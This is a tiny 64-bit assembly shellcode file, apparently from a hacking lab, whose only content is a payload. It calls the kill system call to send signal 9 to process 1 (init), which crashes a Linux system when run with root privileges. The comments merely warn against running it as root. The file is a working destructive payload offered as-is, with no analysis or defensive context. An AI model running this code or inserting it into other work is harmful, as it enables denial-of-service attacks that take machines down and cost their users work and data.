; shellcode-lab64bit
; dash@hack4.org
; don't execute that as root, as long as adjusted
;

BITS 64
global _start

_start:

xor rax, rax
xor rdi, rdi
xor rsi, rsi

mov dil, 1 ; you might not want to run that as root
mov sil,9
mov al, 62
syscall
